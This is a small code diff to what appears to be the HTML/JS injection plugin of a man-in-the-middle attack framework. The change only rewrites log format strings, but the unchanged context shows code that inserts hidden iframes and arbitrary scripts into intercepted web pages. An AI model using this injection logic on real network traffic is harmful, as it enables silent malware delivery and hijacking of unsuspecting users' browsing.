@@ -93,36 +93,36 @@ class Inject(Plugin):
                 if self.html_url:
                     iframe = html.new_tag("iframe", src=self.html_url, frameborder=0, height=0, width=0)
                     html.body.append(iframe)
-                    self.clientlog.info("Injected HTML Iframe: {}".format(hn), extra=request.clientInfo)
+                    self.clientlog.info("Injected HTML Iframe: {0}".format(hn), extra=request.clientInfo)
 
                 if self.html_payload:
                     payload = BeautifulSoup(self.html_payload, "html.parser")
                     html.body.append(payload)
-                    self.clientlog.info("Injected HTML payload: {}".format(hn), extra=request.clientInfo)
+                    self.clientlog.info("Injected HTML payload: {0}".format(hn), extra=request.clientInfo)
 
                 if self.html_file:
                     with open(self.html_file, 'r') as file:
                         payload = BeautifulSoup(file.read(), "html.parser")
                         html.body.append(payload)
-                    self.clientlog.info("Injected HTML file: {}".format(hn), extra=request.clientInfo)
+                    self.clientlog.info("Injected HTML file: {0}".format(hn), extra=request.clientInfo)
 
                 if self.js_url:
                     script = html.new_tag('script', type='text/javascript', src=self.js_url)
                     html.body.append(script)
-                    self.clientlog.info("Injected JS script: {}".format(hn), extra=request.clientInfo)
+                    self.clientlog.info("Injected JS script: {0}".format(hn), extra=request.clientInfo)
 
                 if self.js_payload:
                     tag = html.new_tag('script', type='text/javascript')
                     tag.append(self.js_payload)
                     html.body.append(tag)
-                    self.clientlog.info("Injected JS payload: {}".format(hn), extra=request.clientInfo)
+                    self.clientlog.info("Injected JS payload: {0}".format(hn), extra=request.clientInfo)
 
                 if self.js_file:
                     tag = html.new_tag('script', type='text/javascript')
                     with open(self.js_file, 'r') as file:
                         tag.append(file.read())
                         html.body.append(tag)
-                    self.clientlog.info("Injected JS file: {}".format(hn), extra=request.clientInfo)
+                    self.clientlog.info("Injected JS file: {0}".format(hn), extra=request.clientInfo)
 
                 data = str(html)
 
